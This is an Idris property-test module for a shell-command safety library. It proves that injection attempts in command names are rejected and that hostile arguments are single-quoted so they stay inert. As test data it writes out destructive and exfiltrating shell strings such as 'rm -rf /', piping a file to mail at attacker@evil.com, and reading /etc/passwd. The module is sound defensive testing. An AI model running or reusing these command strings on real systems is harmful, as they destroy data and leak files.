-- SPDX-License-Identifier: MPL-2.0
-- SPDX-FileCopyrightText: 2025 Hyperpolymath
module SafeCommandProps

import Proven.Core
import Proven.SafeCommand
import Data.List
import Data.Maybe
import System

%default total

-- Real API: `cmd : String -> Maybe SafeCommand` validates the command NAME
-- (rejecting shell metacharacters, spaces, leading '-', leading ".."), and
-- arguments are added with withFlag/withLiteral and rendered through
-- `escapeShellArg` (POSIX single quoting). There is no `validateCommand`
-- for whole command lines and no allowlist validator in Proven.SafeCommand;
-- the allowlist properties are mapped to the name gate below (a command
-- name with smuggled arguments, "rm -rf", is rejected).

--------------------------------------------------------------------------------
-- Type-level proofs
--------------------------------------------------------------------------------

||| A simple command name is accepted.
prop_simpleCommandSafe : isJust (cmd "ls") = True
prop_simpleCommandSafe = Refl

||| A command with safe flag and path arguments renders unchanged.
prop_safeArgsValid :
  map (\c => render (withLiteral "/home" (withFlag "-la" c))) (cmd "ls")
    = Just "ls -la /home"
prop_safeArgsValid = Refl

||| Semicolon injection in the command name is rejected.
prop_semicolonBlocked : cmd "ls; rm -rf /" = Nothing
prop_semicolonBlocked = Refl

||| Pipe injection in the command name is rejected.
prop_pipeBlocked : cmd "cat file | mail attacker@evil.com" = Nothing
prop_pipeBlocked = Refl

||| Backtick injection in the command name is rejected.
prop_backtickBlocked : cmd "echo `whoami`" = Nothing
prop_backtickBlocked = Refl

||| `$(...)` injection in the command name is rejected.
prop_dollarParenBlocked : cmd "echo $(cat /etc/passwd)" = Nothing
prop_dollarParenBlocked = Refl

||| Redirect injection in the command name is rejected.
prop_redirectBlocked : cmd "ls > /etc/passwd" = Nothing
prop_redirectBlocked = Refl

||| An injection payload passed as an ARGUMENT is single-quoted (inert).
prop_semicolonArgQuoted : escapeShellArg "; rm -rf /" = "'; rm -rf /'"
prop_semicolonArgQuoted = Refl

||| `$(...)` as an argument renders single-quoted, so it is not substituted.
prop_dollarParenArgQuoted :
  render (withLiteral "$(cat /etc/passwd)" (cmdUnsafe "echo"))
    = "echo '$(cat /etc/passwd)'"
prop_dollarParenArgQuoted = Refl

||| An embedded single quote is closed, escaped and reopened ('\'').
prop_singleQuoteEscaped : escapeShellArg "it's" = "'it'\\''s'"
prop_singleQuoteEscaped = Refl

||| Escaping is undone for display on a quoted argument.
prop_escapePreservesMeaningSample : unescapeForDisplay (escapeShellArg "a b") = "a b"
prop_escapePreservesMeaningSample = Refl

||| Escaped args are safe (universal): a non-empty argument with no shell
||| metacharacter is passed through unquoted, so `escapeShellArg` only leaves
||| text bare when that text is metacharacter-free.
prop_escapedArgsSafe : (s : String) -> containsShellMeta s = False ->
                       null (unpack s) = False -> escapeShellArg s = s
prop_escapedArgsSafe s noMeta nonEmpty = rewrite noMeta in rewrite nonEmpty in Refl

||| Allowlist intent mapped to the real name gate: allowlisted-style names
||| are accepted and "rm -rf" (arguments smuggled into the name) is not.
prop_allowlistValid : (isJust (cmd "ls") && isJust (cmd "cat") && isJust (cmd "grep")) = True
prop_allowlistValid = Refl

prop_nonAllowlistRejected : cmd "rm -rf" = Nothing
prop_nonAllowlistRejected = Refl

--------------------------------------------------------------------------------
-- Outstanding obligations
--------------------------------------------------------------------------------

||| OWED: escaping preserves argument meaning, stated against the library's
||| only inverse (`unescapeForDisplay`) for arguments without a single quote
||| (for those, display-unescaping is documented as lossy). Blocked by:
||| String `++`/`pack`/`unpack` primitives and the where-local
||| `escapeInSingleQuotes` do not reduce on a variable string. This names
||| the proposition; it is not a witness.
public export
EscapePreservesMeaningObligation : Type
EscapePreservesMeaningObligation =
  (s : String) -> elem '\'' (unpack s) = False ->
  unescapeForDisplay (escapeShellArg s) = s

||| OWED: an argument containing a shell metacharacter is emitted wrapped in
||| single quotes. Blocked by: `isPrefixOf`/`isSuffixOf` over String `++`
||| primitives do not reduce on a variable string. This names the
||| proposition; it is not a witness.
public export
EscapedMetaIsQuotedObligation : Type
EscapedMetaIsQuotedObligation =
  (s : String) -> containsShellMeta s = True ->
  (isPrefixOf "'" (escapeShellArg s) && isSuffixOf "'" (escapeShellArg s)) = True

--------------------------------------------------------------------------------
-- Execution checks
--------------------------------------------------------------------------------

private
check : String -> Bool -> IO ()
check label True = putStrLn ("PASS (execution): " ++ label)
check label False = do
  putStrLn ("FAIL: " ++ label)
  exitFailure

private
payloads : List String
payloads = ["; rm -rf /", "a | b", "`whoami`", "$(id)", "> /etc/passwd",
            "x && y", "a b", "\n", "", "{a,b}", "x\0y"]

||| Test runner for command properties
export
runCommandProperties : IO ()
runCommandProperties = do
  putStrLn "SafeCommand Property Tests"
  putStrLn "=========================="
  putStrLn "prop_simpleCommandSafe, prop_safeArgsValid: PASS (proven by type)"
  putStrLn "prop_{semicolon,pipe,backtick,dollarParen,redirect}Blocked: PASS (proven by type)"
  putStrLn "prop_semicolonArgQuoted, prop_dollarParenArgQuoted, prop_singleQuoteEscaped: PASS (proven by type)"
  putStrLn "prop_escapePreservesMeaningSample, prop_escapedArgsSafe: PASS (proven by type)"
  putStrLn "prop_allowlistValid, prop_nonAllowlistRejected: PASS (proven by type)"
  check "payloads containing metacharacters are single-quoted"
    (all (\s => not (containsShellMeta s) ||
                (isPrefixOf "'" (escapeShellArg s) && isSuffixOf "'" (escapeShellArg s)))
         payloads)
  check "display-unescape inverts escaping for quote-free payloads"
    (all (\s => unescapeForDisplay (escapeShellArg s) == s) payloads)
  check "payload command names rejected by cmd"
    (all (\s => isNothing (cmd s)) payloads)
  putStrLn ""
